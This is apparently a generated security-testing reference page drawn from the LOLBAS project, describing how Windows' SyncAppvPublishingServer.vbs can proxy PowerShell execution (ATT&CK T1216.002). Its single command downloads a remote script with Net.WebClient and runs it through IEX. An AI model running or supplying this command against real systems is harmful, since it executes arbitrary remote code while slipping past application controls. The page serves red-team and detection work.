---
parsed_by: focuslocust
source: commands
type: generated
---
# Syncappvpublishingserver.vbs Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Syncappvpublishingserver.vbs

Tool page: [Syncappvpublishingserver.vbs](../../tools/windows/syncappvpublishingserver.vbs.md)

### Use Powershell host invoked from vbs script

```text
SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX"
```

Description:

Inject PowerShell script code with the provided arguments

Related ATT&CK:

- [T1216.002](../../attack/techniques/T1216.002-syncappvpublishingserver.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/Syncappvpublishingserver.yml` |
| Evidence | Command preserved from source parser. |
